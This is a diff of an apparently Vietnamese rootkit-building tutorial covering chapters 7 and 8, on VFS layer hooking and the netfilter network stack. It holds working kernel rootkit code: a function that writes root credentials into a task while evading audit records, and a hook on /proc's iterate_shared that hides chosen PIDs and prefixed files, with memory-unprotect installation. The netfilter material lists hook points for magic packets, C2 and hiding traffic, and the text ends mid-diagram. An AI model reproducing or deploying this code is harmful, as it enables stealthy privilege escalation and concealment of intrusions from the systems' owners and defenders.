 static void rk_dkom_give_root(struct task_struct *task)
 {
     struct cred *cred;
 
-    /* current->cred là const pointer — không thể modify trực tiếp.
-     * Cast bỏ const = undefined behavior theo C standard.
-     * Nhưng trong kernel context, ta có toàn quyền memory access. */
+    /* current->cred la const pointer — khong the modify truc tiep.
+     * Cast bo const = undefined behavior theo C standard.
+     * Nhung trong kernel context, ta co toan quyen memory access. */
     cred = (struct cred *)task->cred;
 
-    /* Trực tiếp overwrite credential fields.
-     * KHÔNG qua prepare_creds/commit_creds:
-     *   + Không tạo audit record (stealthier)
-     *   + Không allocate memory (no failure case)
+    /* Truc tiep overwrite credential fields.
+     * KHONG qua prepare_creds/commit_creds:
+     *   + Khong tao audit record (stealthier)
+     *   + Khong allocate memory (no failure case)
      *   - Potential race condition
      *   - Violates kernel credential model
-     *   - Có thể corrupt state nếu concurrent reader */
+     *   - Co the corrupt state neu concurrent reader */
 
     cred->uid.val = 0;
     cred->gid.val = 0;
@@ -3415,26 +5035,259 @@ static void rk_dkom_give_root(struct task_struct *task)
 
 ## Chapter 7: VFS Layer Hooking
 
+### 7.0 VFS Architecture — An file tan tang filesystem
+
+Truoc khi hieu code VFS hooking, ban can nam duoc cach Linux kernel to chuc filesystem access. VFS (Virtual File System) la lop truu tuong cho phep kernel lam viec voi nhieu loai filesystem (ext4, xfs, btrfs, procfs, sysfs, tmpfs...) qua mot giao dien thong nhat.
+
+#### 7.0.1 VFS 4-Layer Model
+
+```
+  Application: open("/home/user/secret.txt", O_RDONLY)
+       │
+       │  syscall: sys_openat() → do_sys_openat2()
+       │
+       ▼
+  ┌─── VFS Layer ─────────────────────────────────────────────────────┐
+  │                                                                    │
+  │  Path Lookup (fs/namei.c — path_lookupat):                        │
+  │    "/" → lookup dentry cache (dcache)                               │
+  │         hit? → dung cached dentry                                  │
+  │         miss? → goi filesystem .lookup()                           │
+  │    "home" → lookup dentry for "home" under "/"                     │
+  │    "user" → lookup dentry for "user" under "home"                  │
+  │    "secret.txt" → lookup final component                           │
+  │                                                                    │
+  │  Moi component: resolve dentry → get inode → check permission      │
+  │  Cuoi cung: tao struct file, gan file_operations tu inode          │
+  │                                                                    │
+  │  readdir/getdents64 (doc noi dung directory):                      │
+  │    sys_getdents64() → iterate_dir(file, ctx)                       │
+  │      → file->f_op->iterate_shared(file, ctx)                      │
+  │                          ↑                                         │
+  │                   ROOTKIT HOOK POINT                                │
+  └────────────────────────────────────────────────────────────────────┘
+       │
+       ▼
+  ┌─── Filesystem Layer (ext4, xfs, procfs, sysfs) ───────────────────┐
+  │                                                                    │
+  │  Moi filesystem implement cac operations:                          │
+  │    .iterate_shared()  — readdir (liet ke directory entries)         │
+  │    .lookup()          — tim inode theo ten trong directory          │
+  │    .read_iter()       — doc noi dung file                          │
+  │    .write_iter()      — ghi noi dung file                          │
+  │    .open()            — xu ly khi file duoc mo                     │
+  │                                                                    │
+  │  procfs (/proc):                                                   │
+  │    iterate_shared → liet ke PID directories + pseudo-files         │
+  │    Rootkit hook iterate_shared cua /proc → an PID directories      │
+  │                                                                    │
+  │  ext4/xfs (filesystem that):                                       │
+  │    iterate_shared → doc disk blocks chua directory entries          │
+  │    Rootkit hook iterate_shared → an files tren disk                 │
+  └────────────────────────────────────────────────────────────────────┘
+       │
+       ▼
+  ┌─── Block Layer / Page Cache ──────────────────────────────────────┐
+  │                                                                    │
+  │  Page Cache: cache file data trong RAM                             │
+  │  Block Layer: bio requests, I/O scheduler, device driver           │
+  │  → Rootkit THUONG KHONG hook o day (qua sau, phuc tap)             │
+  └────────────────────────────────────────────────────────────────────┘
+```
+
+#### 7.0.2 Key VFS Structures
+
+4 struct chinh tao thanh VFS — hieu moi quan he giua chung la THEN CHOT de hieu VFS hooking:
+
+```
+  struct super_block (fs/super.c)
+  ┌──────────────────────────────────────────────────────┐
+  │ MOT per mounted filesystem instance                   │
+  │                                                      │
+  │ s_type     — filesystem type (ext4_fs_type, proc_fs) │
+  │ s_root     — dentry cua mount point                  │
+  │ s_bdev     — block device (NULL cho pseudo-fs)       │
+  │ s_op       — super_operations (alloc_inode, etc.)    │
+  │ s_flags    — mount flags (MS_RDONLY, etc.)            │
+  └──────────────────────────────────────────────────────┘
+         │ s_root
+         ▼
+  struct dentry (include/linux/dcache.h)
+  ┌──────────────────────────────────────────────────────┐
+  │ MOT per path component TRONG CACHE                    │
+  │ (co the nhieu dentries tro toi cung inode — hardlinks)│
+  │                                                      │
+  │ d_name     — ten component (vd: "home", "secret.txt")│
+  │ d_inode    — pointer toi inode ←──────────────┐      │
+  │ d_parent   — parent dentry                    │      │
+  │ d_subdirs  — list of child dentries           │      │
+  │ d_op       — dentry_operations                │      │
+  │                                               │      │
+  │ Tao thanh directory tree trong memory:        │      │
+  │   dentry("/") → dentry("home") → dentry("user")     │
+  └──────────────────────────────────────────────────────┘
+         │ d_inode                                │
+         ▼                                        │
+  struct inode (include/linux/fs.h)               │
+  ┌──────────────────────────────────────────────────────┐
+  │ MOT per file/directory TREN DISK                      │
+  │ (persistent metadata — ton tai khi khong open)        │
+  │                                                      │
+  │ i_ino      — inode number                            │
+  │ i_mode     — permissions + file type (S_IFREG, etc.) │
+  │ i_uid/gid  — owner                                  │
+  │ i_size     — file size                               │
+  │ i_atime/mtime/ctime — timestamps                    │
+  │ i_op       — inode_operations (lookup, permission)   │
+  │ i_fop      — default file_operations ←───────┐      │
+  │              (copy vao struct file khi open)  │      │
+  └──────────────────────────────────────────────────────┘
+         │ i_fop                                  │
+         ▼                                        │
+  struct file (include/linux/fs.h)                │
+  ┌──────────────────────────────────────────────────────┐
+  │ MOT per open file descriptor                          │
+  │ (per-process, per-open — transient)                   │
+  │                                                      │
+  │ f_path     — dentry + mount point                    │
+  │ f_inode    — inode pointer                           │
+  │ f_pos      — current read/write position (loff_t)    │
+  │ f_flags    — O_RDONLY, O_WRONLY, etc.                 │
+  │ f_mode     — FMODE_READ, FMODE_WRITE                 │
+  │ f_op       — file_operations ← ═══ HOOK TARGET ═══  │
+  │              (copy tu inode->i_fop khi open)         │
+  │              .iterate_shared = readdir handler       │
+  │              .read_iter = read handler               │
+  │              .write_iter = write handler              │
+  └──────────────────────────────────────────────────────┘
+```
+
+#### 7.0.3 Directory Iteration Mechanism — Chi tiet tung buoc
+
+Khi user chay `ls /proc`, day la CHINH XAC nhung gi xay ra trong kernel, va rootkit hook o dau:
+
+```
+  Userspace: ls /proc
+       │
+       │ syscall: getdents64(fd, buf, count)
+       ▼
+  Kernel: sys_getdents64() (fs/readdir.c)
+       │
+       ▼
+  iterate_dir(file, ctx)                    ← ctx->actor = filldir64
+       │
+       ▼
+  file->f_op->iterate_shared(file, ctx)     ← ROOTKIT REPLACES THIS
+       │                                       voi hooked_proc_iterate()
+       │  (filesystem-specific implementation)
+       │  (cho /proc: proc_root_readdir)
+       │
+       ▼
+  Filesystem iterate moi entry:
+       │
+       ├── dir_emit(ctx, "1", 1, ino, DT_DIR)     → ctx->actor("1")    PID 1
+       ├── dir_emit(ctx, "2", 1, ino, DT_DIR)     → ctx->actor("2")    PID 2
+       ├── dir_emit(ctx, "1337", 4, ino, DT_DIR)  → ctx->actor("1337") PID 1337
+       │                                               ↑
+       │                                    ROOTKIT'S FILLDIR:
+       │                                    "1337 la hidden PID?"
+       │                                    "YES → return SKIP"
+       │                                    → entry KHONG ghi vao user buffer
+       │                                    → ls KHONG thay PID 1337
+       │
+       ├── dir_emit(ctx, "cpuinfo", 7, ino, DT_REG)
+       ├── dir_emit(ctx, "meminfo", 7, ino, DT_REG)
+       └── ...
+
+  ctx->actor (filldir callback):
+    Goi boi filesystem cho MOI directory entry
+    Ghi entry vao user buffer (getdents64 output)
+    Return: continue/stop iteration
+
+  Rootkit strategy:
+    1. Hook file->f_op->iterate_shared → hooked_proc_iterate
+    2. hooked_proc_iterate tao wrapper dir_context voi custom actor
+    3. Custom actor (rk_proc_filldir) nhan MOI entry
+    4. Check neu entry can an → skip (khong goi original actor)
+    5. Entry khong an → goi original actor (pass through)
+```
+
+#### 7.0.4 container_of Deep Dive — Vi du cu the trong VFS hook code
+
+Day la vi du thuc te ve cach rootkit dung `container_of` trong VFS hook. Hieu sai macro nay = memory corruption = kernel crash:
+
+```c
+/* Rootkit dinh nghia struct nay: */
+struct rk_filldir_data {
+    struct dir_context ctx;        /* offset 0 — vi la field dau tien */
+    struct dir_context *orig_ctx;  /* offset 16 (sizeof(dir_context) = 16) */
+};
+
+/* Trong rk_proc_filldir, kernel goi voi pointer toi ctx field: */
+static filldir_ret_t rk_proc_filldir(struct dir_context *ctx, ...)
+{
+    /* ctx tro toi truong ctx BEN TRONG rk_filldir_data.
+     * Ta can lay pointer toi rk_filldir_data de access orig_ctx. */
+    
+    struct rk_filldir_data *data =
+        container_of(ctx, struct rk_filldir_data, ctx);
+    
+    /* Phan tich macro: */
+    /* container_of(ctx, struct rk_filldir_data, ctx)
+     * = (struct rk_filldir_data *)((char *)ctx - offsetof(struct rk_filldir_data, ctx))
+     * = (struct rk_filldir_data *)((char *)ctx - 0)
+     *                                             ↑
+     *                           offsetof = 0 vi ctx la field dau tien!
+     * = (struct rk_filldir_data *)ctx
+     *
+     * Trong truong hop nay, vi ctx la field dau tien (offset 0),
+     * container_of don gian chi la cast. Nhung KHONG nen bo qua
+     * container_of va cast truc tiep — neu struct layout thay doi
+     * (them field truoc ctx), cast se SAI nhung container_of van DUNG.
+     */
+    
+    /* Memory layout:
+     *
+     * Address:     rk_filldir_data struct
+     * 0x1000:  ┌── ctx.actor (function pointer, 8 bytes)   ─┐
+     *          │                                              │ dir_context
+     * 0x1008:  │   ctx.pos (loff_t, 8 bytes)                ─┘
+     * 0x1010:  │   orig_ctx (pointer, 8 bytes)   ← data->orig_ctx
+     *          └──
+     *
+     * ctx parameter points to 0x1000
+     * container_of returns 0x1000 (= 0x1000 - 0)
+     * data->orig_ctx reads from 0x1010
+     */
+}
+```
+
+**CANH BAO QUAN TRONG:** Khi goi original filldir, PHAI pass `data->orig_ctx` (original context), KHONG PHAI `&data->ctx` (wrapper context). Original filldir co the dung `container_of` tren context nhan duoc — neu pass wrapper context, no se tinh offset SAI va doc/ghi vao wrong memory location → kernel crash hoac data corruption.
+
+**Tham khao source:** `include/linux/fs.h` (struct file, struct inode, file_operations), `fs/readdir.c` (iterate_dir, filldir64), `fs/namei.c` (path lookup), `include/linux/dcache.h` (struct dentry)
+
+---
+
 ```c
 /* vfs_hook.c — VFS (Virtual File System) layer hooking
  *
- * Hook ở VFS layer = sâu hơn syscall table hook.
+ * Hook o VFS layer = sau hon syscall table hook.
  *
  * Hierarchy:
  *   Syscall: sys_getdents64 → vfs_readdir → file->f_op->iterate_shared
- *   Hook tại f_op level bypass detection dựa trên syscall table check.
+ *   Hook tai f_op level bypass detection dua tren syscall table check.
  *
  * VFS Architecture:
- *   Mỗi open file → struct file → f_op (file_operations)
- *   f_op chứa function pointers cho mọi operation trên file.
+ *   Moi open file → struct file → f_op (file_operations)
+ *   f_op chua function pointers cho moi operation tren file.
  *
- *   Cụ thể cho directories:
+ *   Cu the cho directories:
  *   f_op->iterate_shared() = read directory entries
- *   Hook iterate_shared → control output của readdir/getdents
+ *   Hook iterate_shared → control output cua readdir/getdents
  *
- * procfs (/proc) dùng VFS — mỗi /proc entry có riêng f_op.
- * Hook f_op của /proc root directory → control /proc listing
- * → ẩn process mà không cần hook syscall table.
+ * procfs (/proc) dung VFS — moi /proc entry co rieng f_op.
+ * Hook f_op cua /proc root directory → control /proc listing
+ * → an process ma khong can hook syscall table.
  */
 
 #include "rootkit.h"
@@ -3443,18 +5296,18 @@ static void rk_dkom_give_root(struct task_struct *task)
 /* ══════════════════════════════════════════════════════════════
  * KERNEL VERSION COMPATIBILITY
  *
- * filldir_t return value thay đổi giữa kernel versions:
+ * filldir_t return value thay doi giua kernel versions:
  *   Kernel < 6.1: filldir_t returns int
- *     0     = success, tiếp tục iterate
- *     non-0 = error, DỪNG iterate
+ *     0     = success, tiep tuc iterate
+ *     non-0 = error, DUNG iterate
  *
  *   Kernel >= 6.1: filldir_t returns bool
  *     true  = continue iteration
  *     false = stop iteration
  *
- * Nếu dùng sai return value:
- *   Trả true trên kernel < 6.1 = "error, stop" = TẤT CẢ entries
- *   sau entry hidden đầu tiên đều invisible.
+ * Neu dung sai return value:
+ *   Tra true tren kernel < 6.1 = "error, stop" = TAT CA entries
+ *   sau entry hidden dau tien deu invisible.
  * ══════════════════════════════════════════════════════════════ */
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
@@ -3468,38 +5321,38 @@ static void rk_dkom_give_root(struct task_struct *task)
 #endif
 
 /* ══════════════════════════════════════════════════════════════
- * Hook iterate_shared trên /proc directory
+ * Hook iterate_shared tren /proc directory
  *
- * Khi ls /proc, kernel gọi:
+ * Khi ls /proc, kernel goi:
  *   proc_root.f_op->iterate_shared(file, ctx)
  *
- * iterate_shared dùng callback pattern:
- *   Kernel iterate entries → cho mỗi entry gọi ctx->actor
- *   actor = filldir function (ghi entry vào user buffer)
+ * iterate_shared dung callback pattern:
+ *   Kernel iterate entries → cho moi entry goi ctx->actor
+ *   actor = filldir function (ghi entry vao user buffer)
  *
  * Hook strategy:
- *   1. Lấy original iterate_shared
- *   2. Replace bằng hooked version
- *   3. Hooked version tạo wrapper dir_context với custom filldir
- *   4. Custom filldir filter entries trước khi pass tới original filldir
+ *   1. Lay original iterate_shared
+ *   2. Replace bang hooked version
+ *   3. Hooked version tao wrapper dir_context voi custom filldir
+ *   4. Custom filldir filter entries truoc khi pass toi original filldir
  *
  * Thread safety:
- *   Không dùng global variable cho orig_proc_filldir vì
- *   2 CPUs concurrent gọi iterate_shared có thể race:
+ *   Khong dung global variable cho orig_proc_filldir vi
+ *   2 CPUs concurrent goi iterate_shared co the race:
  *     CPU1: set orig = filldir_A
  *     CPU2: set orig = filldir_B
- *     CPU1: dùng orig (= filldir_B!) ← WRONG
- *   Giải pháp: dùng per-call storage trong wrapper struct.
+ *     CPU1: dung orig (= filldir_B!) ← WRONG
+ *   Giai phap: dung per-call storage trong wrapper struct.
  * ══════════════════════════════════════════════════════════════ */
 
 static int (*orig_proc_iterate)(struct file *, struct dir_context *);
 
 /*
- * Wrapper struct chứa per-call data.
+ * Wrapper struct chua per-call data.
  *
- * Embed custom dir_context (với actor = filter) VÀ pointer
- * tới ORIGINAL dir_context. Khi cần gọi original filldir,
- * pass original context (không phải wrapper) để tránh
+ * Embed custom dir_context (voi actor = filter) VA pointer
+ * toi ORIGINAL dir_context. Khi can goi original filldir,
+ * pass original context (khong phai wrapper) de tranh
  * container_of corruption.
  *
  * Layout:
@@ -3510,11 +5363,11 @@ static int (*orig_proc_iterate)(struct file *, struct dir_context *);
  */
 struct rk_filldir_data {
     struct dir_context  ctx;        /* Wrapper context (actor = our filter) */
-    struct dir_context *orig_ctx;   /* Pointer tới ORIGINAL user context */
+    struct dir_context *orig_ctx;   /* Pointer toi ORIGINAL user context */
 };
 
 /*
- * Custom filldir — called cho mỗi entry trong /proc
+ * Custom filldir — called cho moi entry trong /proc
  *
  * dir_context callback signature:
  *   filldir_ret_t filldir(struct dir_context *ctx, const char *name,
@@ -3525,82 +5378,82 @@ struct rk_filldir_data {
  * namlen  = length of name
  * d_type  = DT_DIR, DT_REG, etc.
  *
- * Return FILLDIR_SKIP để skip entry (ẩn) mà vẫn tiếp tục iterate.
+ * Return FILLDIR_SKIP de skip entry (an) ma van tiep tuc iterate.
  */
 static filldir_ret_t rk_proc_filldir(struct dir_context *ctx,
                                       const char *name, int namlen,
                                       loff_t offset, u64 ino,
                                       unsigned int d_type)
 {
-    /* Recover per-call data từ wrapper struct */
+    /* Recover per-call data tu wrapper struct */
     struct rk_filldir_data *data =
         container_of(ctx, struct rk_filldir_data, ctx);
 
-    /* Case 1: Ẩn PID directory */
+    /* Case 1: An PID directory */
     if (d_type == DT_DIR) {
         long pid_val;
         char pid_str[16];
 
-        /* Copy name vì kstrtol cần null-terminated string.
-         * name từ kernel đã null-terminated nhưng safe practice. */
+        /* Copy name vi kstrtol can null-terminated string.
+         * name tu kernel da null-terminated nhung safe practice. */
         if (namlen < sizeof(pid_str)) {
             memcpy(pid_str, name, namlen);
             pid_str[namlen] = '\0';
 
             if (kstrtol(pid_str, 10, &pid_val) == 0) {
-                /* name là numeric → PID directory.
-                 * Check nếu PID cần ẩn. */
+                /* name la numeric → PID directory.
+                 * Check neu PID can an. */
                 if (is_pid_hidden((pid_t)pid_val))
-                    return FILLDIR_SKIP;  /* Skip — PID ẩn, tiếp tục iterate */
+                    return FILLDIR_SKIP;  /* Skip — PID an, tiep tuc iterate */
             }
         }
     }
 
-    /* Case 2: Ẩn file/directory có prefix */
+    /* Case 2: An file/directory co prefix */
     if (namlen >= strlen(HIDDEN_PREFIX) &&
         strncmp(name, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) == 0) {
-        return FILLDIR_SKIP;  /* Skip entry, tiếp tục iterate */
+        return FILLDIR_SKIP;  /* Skip entry, tiep tuc iterate */
     }
 
-    /* Entry hợp lệ — gọi original filldir với ORIGINAL context.
+    /* Entry hop le — goi original filldir voi ORIGINAL context.
      *
-     * QUAN TRỌNG: pass data->orig_ctx (original context), KHÔNG phải
-     * &data->ctx (wrapper). Original filldir có thể dùng container_of
-     * trên context → nếu pass wrapper → tính toán offset sai →
+     * QUAN TRONG: pass data->orig_ctx (original context), KHONG phai
+     * &data->ctx (wrapper). Original filldir co the dung container_of
+     * tren context → neu pass wrapper → tinh toan offset sai →
      * memory corruption.
      *
-     * orig_ctx->actor = original filldir callback từ VFS layer. */
+     * orig_ctx->actor = original filldir callback tu VFS layer. */
     return data->orig_ctx->actor(data->orig_ctx, name, namlen,
                                   offset, ino, d_type);
 }
 
 /*
- * Hooked iterate_shared — tạo wrapper context per-call.
+ * Hooked iterate_shared — tao wrapper context per-call.
  *
- * Tạo rk_filldir_data trên stack (per-call, thread-safe).
- * Set actor = rk_proc_filldir, lưu pointer tới original context.
- * Pass wrapper tới orig_proc_iterate.
+ * Tao rk_filldir_data tren stack (per-call, thread-safe).
+ * Set actor = rk_proc_filldir, luu pointer toi original context.
+ * Pass wrapper toi orig_proc_iterate.
  */
 static int hooked_proc_iterate(struct file *file,
                                 struct dir_context *ctx)
 {
     int ret;
 
-    /* Wrap user's dir_context trong struct chứa per-call data */
+    /* Wrap user's dir_context trong struct chua per-call data */
     struct rk_filldir_data data = {
         .ctx.actor = rk_proc_filldir,
         .ctx.pos   = ctx->pos,
         .orig_ctx  = ctx,    /* Save pointer to original */
     };
 
-    /* Gọi original iterate_shared với wrapped context.
-     * Kernel sẽ iterate /proc entries → gọi rk_proc_filldir
-     * cho mỗi entry → rk_proc_filldir filter → pass hoặc skip. */
+    /* Goi original iterate_shared voi wrapped context.
+     * Kernel se iterate /proc entries → goi rk_proc_filldir
+     * cho moi entry → rk_proc_filldir filter → pass hoac skip. */
     ret = orig_proc_iterate(file, &data.ctx);
 
     /* Sync position back to original context.
-     * iterate_shared updates ctx->pos — ta cần propagate
-     * change về original context. */
+     * iterate_shared updates ctx->pos — ta can propagate
+     * change ve original context. */
     ctx->pos = data.ctx.pos;
 
     return ret;
@@ -3609,13 +5462,13 @@ static int hooked_proc_iterate(struct file *file,
 /* ══════════════════════════════════════════════════════════════
  * INSTALLATION
  *
- * Để hook iterate_shared, ta phải:
- * 1. Tìm file_operations struct của /proc root
+ * De hook iterate_shared, ta phai:
+ * 1. Tim file_operations struct cua /proc root
  * 2. Save original iterate_shared pointer
- * 3. Replace bằng hooked version
+ * 3. Replace bang hooked version
  *
- * Thách thức: file_operations thường const (read-only).
- * Phải make writable trước khi modify.
+ * Thach thuc: file_operations thuong const (read-only).
+ * Phai make writable truoc khi modify.
  * ══════════════════════════════════════════════════════════════ */
 
 static struct file_operations *proc_fops = NULL;
@@ -3624,31 +5477,31 @@ int rk_vfs_hook_install(void)
 {
     struct file *proc_file;
 
-    /* Mở /proc để lấy file_operations.
+    /* Mo /proc de lay file_operations.
      *
-     * filp_open(): kernel-internal open. Khác open() syscall:
-     * - Không đi qua VFS name resolution chain
-     * - Trực tiếp resolve path và return struct file *
-     * - Chạy trong kernel context (không phải process context fd) */
+     * filp_open(): kernel-internal open. Khac open() syscall:
+     * - Khong di qua VFS name resolution chain
+     * - Truc tiep resolve path va return struct file *
+     * - Chay trong kernel context (khong phai process context fd) */
     proc_file = filp_open("/proc", O_RDONLY, 0);
     if (IS_ERR(proc_file)) {
         pr_err("rk: cannot open /proc\n");
         return PTR_ERR(proc_file);
     }
 
-    /* Lấy file_operations từ struct file.
+    /* Lay file_operations tu struct file.
      *
-     * f_op = file operations table cho file/directory này.
-     * Mọi file thuộc cùng filesystem type chia sẻ f_op.
-     * → Modify f_op = affect TẤT CẢ files cùng type.
-     * Cho /proc: proc_root_operations là shared. */
+     * f_op = file operations table cho file/directory nay.
+     * Moi file thuoc cung filesystem type chia se f_op.
+     * → Modify f_op = affect TAT CA files cung type.
+     * Cho /proc: proc_root_operations la shared. */
     proc_fops = (struct file_operations *)proc_file->f_op;
 
     /* Save original */
     orig_proc_iterate = proc_fops->iterate_shared;
 
     /* Make f_op writable.
-     * file_operations struct thường trong read-only memory. */
+     * file_operations struct thuong trong read-only memory. */
     rk_unprotect_memory();
 
     /* Overwrite iterate_shared pointer */
@@ -3679,10 +5532,280 @@ void rk_vfs_hook_remove(void)
 
 ## Chapter 8: Network Rootkit — Netfilter & Covert Channel
 
+### 8.0 Network Stack Internals — Tu NIC toi socket
+
+De hieu rootkit network hooking, ban can hieu duong di cua packet tu khi vao NIC den khi toi application, va nguoc lai. Rootkit hook vao cac diem chinh tren duong di nay.
+
+#### 8.0.1 Packet Receive Path — Tung buoc tu hardware toi userspace
+
+```
+  ┌──────────────────────────────────────────────────────────────┐
+  │ PACKET RECEIVE PATH (Ingress)                                │
+  │                                                              │
+  │ 1. NIC nhan frame tu wire/wifi                               │
+  │    │  Hardware interrupt (IRQ) fired                         │
+  │    ▼                                                         │
+  │ 2. IRQ Handler (drivers/net/ethernet/...)                    │
+  │    │  Schedule NAPI poll (khong xu ly packet trong IRQ!)      │
+  │    │  napi_schedule() — chuyen sang softirq context           │
+  │    ▼                                                         │
+  │ 3. NAPI Poll (net/core/dev.c — napi_poll)                   │
+  │    │  Doc packets tu NIC ring buffer (batch processing)      │
+  │    │  Tao/fill sk_buff cho moi packet                        │
+  │    │  Goi netif_receive_skb() cho moi packet                │
+  │    ▼                                                         │
+  │ 4. netif_receive_skb() → __netif_receive_skb_core()         │
+  │    │  XDP processing (neu co)                                │
+  │    │  Protocol handler dispatch (ip_rcv cho IPv4)            │
+  │    ▼                                                         │
+  │ 5. ip_rcv() (net/ipv4/ip_input.c)                           │
+  │    │  Validate IP header (checksum, version, length)         │
+  │    ▼                                                         │
+  │ ┌──────────────────────────────────────────────────────┐     │
+  │ │ 6. NF_INET_PRE_ROUTING hooks ← ═══ ROOTKIT ═══      │     │
+  │ │    Netfilter hook POINT — earliest interception      │     │
+  │ │    Rootkit registered hook chay o day                │     │
+  │ │    Verdicts: NF_ACCEPT, NF_DROP, NF_STOLEN           │     │
+  │ └──────────────────────────────────────────────────────┘     │
+  │    │                                                         │
+  │    ▼                                                         │
+  │ 7. ip_route_input() — routing decision                      │
+  │    │                                                         │
+  │    ├─── For LOCAL delivery: ──────────────────────┐          │
+  │    │    │                                          │          │
+  │    │    ▼                                          │          │
+  │    │    NF_INET_LOCAL_IN hooks ← rootkit co the   │          │
+  │    │    │                         hook o day       │          │
+  │    │    ▼                                          │          │
+  │    │    Transport layer:                           │          │
+  │    │    tcp_v4_rcv() hoac udp_rcv()               │          │
+  │    │    │                                          │          │
+  │    │    ▼                                          │          │
+  │    │    Socket receive buffer → application read   │          │
+  │    │                                               │          │
+  │    └─── For FORWARDING: ──────────────────────────┘          │
+  │         │                                                    │
+  │         ▼                                                    │
+  │         NF_INET_FORWARD hooks                                │
+  │         │                                                    │
+  │         ▼                                                    │
+  │         NF_INET_POST_ROUTING hooks                           │
+  │         │                                                    │
+  │         ▼                                                    │
+  │         dev_queue_xmit() → NIC transmit                      │
+  └──────────────────────────────────────────────────────────────┘
+
+  ┌──────────────────────────────────────────────────────────────┐
+  │ PACKET SEND PATH (Egress)                                    │
+  │                                                              │
+  │ Application: send()/sendto()/sendmsg()                       │
+  │    │                                                         │
+  │    ▼                                                         │
+  │ Transport: tcp_sendmsg() / udp_sendmsg()                    │
+  │    │  Build TCP/UDP header, segment data                     │
+  │    ▼                                                         │
+  │ IP: ip_queue_xmit() / ip_push_pending_frames()              │
+  │    │  Build IP header                                        │
+  │    ▼                                                         │
+  │ ┌──────────────────────────────────────────────────────┐     │
+  │ │ NF_INET_LOCAL_OUT hooks ← ═══ ROOTKIT ═══            │     │
+  │ │   Hook outgoing packets tu local processes           │     │
+  │ │   An traffic, modify packets truoc khi gui           │     │
+  │ └──────────────────────────────────────────────────────┘     │
+  │    │                                                         │
+  │    ▼                                                         │
+  │ ip_output() → ip_finish_output()                            │
+  │    │                                                         │
+  │    ▼                                                         │
+  │ NF_INET_POST_ROUTING hooks                                  │
+  │    │  (SNAT, MASQUERADE)                                     │
+  │    ▼                                                         │
+  │ dev_queue_xmit() → NIC driver → wire                        │
+  └──────────────────────────────────────────────────────────────┘
+```
+
+#### 8.0.2 Netfilter Hook Points — 5 diem hook va y nghia
+
+```
+  ┌────────────────────────┬────────────────────────────────┬───────────────────────┐
+  │ Hook Point             │ Khi nao chay                   │ Rootkit dung de       │
+  ├────────────────────────┼────────────────────────────────┼───────────────────────┤
+  │ NF_INET_PRE_ROUTING    │ Sau receive, TRUOC routing     │ Magic packet detect   │
+  │                        │ decision. Packet moi vao,      │ Drop C2 traffic       │
+  │                        │ chua biet local hay forward.   │ DNAT (port redirect)  │
+  │                        │                                │ ← ROOTKIT THUONG DUNG │
+  ├────────────────────────┼────────────────────────────────┼───────────────────────┤
+  │ NF_INET_LOCAL_IN       │ Sau routing, packet cho LOCAL  │ Input firewall        │
+  │                        │ host. Da biet packet la cho ta.│ Filter incoming conns │
+  │                        │                                │ Hide specific ports   │
+  ├────────────────────────┼────────────────────────────────┼───────────────────────┤
+  │ NF_INET_FORWARD        │ Packet duoc FORWARD (router).  │ Forward firewall      │
+  │                        │ KHONG phai cho local host.     │ (it dung cho rootkit) │
+  ├────────────────────────┼────────────────────────────────┼───────────────────────┤
+  │ NF_INET_LOCAL_OUT      │ Packet tu LOCAL process, TRUOC │ Filter outgoing       │
+  │                        │ routing. Generate boi socket.  │ Hide rootkit traffic  │
+  │                        │                                │ Modify outgoing pkts  │
+  ├────────────────────────┼────────────────────────────────┼───────────────────────┤
+  │ NF_INET_POST_ROUTING   │ Sau routing, TRUOC khi gui ra  │ SNAT, MASQUERADE      │
+  │                        │ NIC. Packet sap di ra wire.    │ (it dung cho rootkit) │
+  └────────────────────────┴────────────────────────────────┴───────────────────────┘
+
+  Netfilter verdicts:
+  ─────────────────────────────────────────────────────────────
+  NF_ACCEPT  — Cho packet di tiep qua cac hooks tiep theo
+  NF_DROP    — Huy packet. kfree_skb() duoc goi. Silent drop.
+  NF_STOLEN  — "Toi lay quyen so huu packet nay."
+               Netfilter KHONG free packet, KHONG xu ly tiep.
+               Rootkit PHAI tu kfree_skb() hoac no se LEAK.
+               Packet KHONG bao gio toi application layer.
+               → INVISIBLE cho tcpdump (neu capture SAU hook)
+               → INVISIBLE cho netstat, ss
+  NF_QUEUE   — Gui packet toi userspace (nfqueue)
+  NF_REPEAT  — Goi lai hook nay (careful: infinite loop!)
+```
+
+#### 8.0.3 struct sk_buff — Cau truc QUAN TRONG NHAT cua networking
+
+`struct sk_buff` (include/linux/skbuff.h) la cau truc bieu dien MOI packet trong Linux kernel. Moi packet nhan hoac gui deu la mot `sk_buff`. Struct nay khoang ~232 bytes metadata + variable-length data buffer.
+
+```
+  ┌── struct sk_buff (include/linux/skbuff.h) ─────────────────────────┐
+  │                                                                     │
+  │  struct sk_buff *next, *prev;   — packet queue (doubly-linked)     │
+  │  struct sock *sk;               — owning socket (NULL if no sock)  │
+  │  struct net_device *dev;        — network device (eth0, lo, etc.)  │
+  │  unsigned long _skb_refdst;     — routing destination cache        │
+  │                                                                     │
+  │  ┌─────────────────────────────────────────────────────────────┐   │
+  │  │ Buffer Pointers — quan trong nhat de hieu packet parsing    │   │
+  │  │                                                              │   │
+  │  │  unsigned char *head;   ─┐  Bat dau cua allocated buffer    │   │
+  │  │  unsigned char *data;   ─┤  Bat dau cua packet data hien tai│   │
+  │  │  unsigned char *tail;   ─┤  Ket thuc cua packet data        │   │
+  │  │  unsigned char *end;    ─┘  Ket thuc cua allocated buffer   │   │
+  │  │                                                              │   │
+  │  │  Bat buoc: head <= data <= tail <= end                       │   │
+  │  └─────────────────────────────────────────────────────────────┘   │
+  │                                                                     │
+  │  __u16 network_header;     — offset tu head toi IP header          │
+  │  __u16 transport_header;   — offset tu head toi TCP/UDP header     │
+  │  __u16 mac_header;         — offset tu head toi MAC header         │
+  │                                                                     │
+  │  __u32 len;                — tong chieu dai data (bao gom fragments)│
+  │  __u32 data_len;           — chieu dai data trong fragments        │
+  │  __u16 protocol;           — ETH_P_IP (0x0800), ETH_P_ARP, etc.   │
+  │  __u8  pkt_type;           — PACKET_HOST, PACKET_BROADCAST, etc.   │
+  │                                                                     │
+  │  struct sec_path *sp;      — IPsec path                            │
+  │  __u32 mark;               — packet mark (dung boi iptables/nft)   │
+  └─────────────────────────────────────────────────────────────────────┘
+
+  Buffer layout trong memory:
+  ═══════════════════════════════════════════════════════════════════════
+
+  head ──────────────────────────────────────────────────────────── end
+  │         │                                              │       │
